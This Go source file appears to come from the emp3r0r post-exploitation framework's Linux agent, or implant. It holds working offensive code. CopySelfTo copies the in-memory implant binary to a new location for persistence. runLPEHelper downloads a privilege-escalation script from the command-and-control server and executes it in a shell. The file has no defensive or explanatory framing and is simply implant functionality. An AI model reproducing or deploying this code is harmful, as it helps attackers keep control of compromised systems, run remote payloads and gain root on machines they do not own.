//go:build linux
// +build linux

package agent

import (
	"fmt"
	"log"
	"os"
	"strings"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// Copy current executable to a new location
func CopySelfTo(dest_file string) (err error) {
	err = util.FindEXEInMem()
	if err != nil {
		return fmt.Errorf("FindEXEInMem: %v", err)
	}
	elf_data := util.EXE_MEM_FILE

	// mkdir -p if directory not found
	dest_dir := strings.Join(strings.Split(dest_file, "/")[:len(strings.Split(dest_file, "/"))-1], "/")
	if !util.IsExist(dest_dir) {
		err = os.MkdirAll(dest_dir, 0o700)
		if err != nil {
			return
		}
	}

	// overwrite
	if util.IsExist(dest_file) {
		os.RemoveAll(dest_file)
	}

	return os.WriteFile(dest_file, elf_data, 0o755)
}

// runLPEHelper runs helper scripts to give you hints on how to escalate privilege
func runLPEHelper(method string) (out string) {
	log.Printf("Downloading LPE script from %s", emp3r0r_data.CCAddress+method)
	var scriptData []byte
	scriptData, err := DownloadViaCC(method, "")
	if err != nil {
		return "Download error: " + err.Error()
	}

	// run the script
	log.Printf("Running LPE helper %s", method)
	out, err = RunShellScript(scriptData)
	if err != nil {
		return fmt.Sprintf("Run LPE helper %s failed: %s %v", method, out, err)
	}

	return out
}
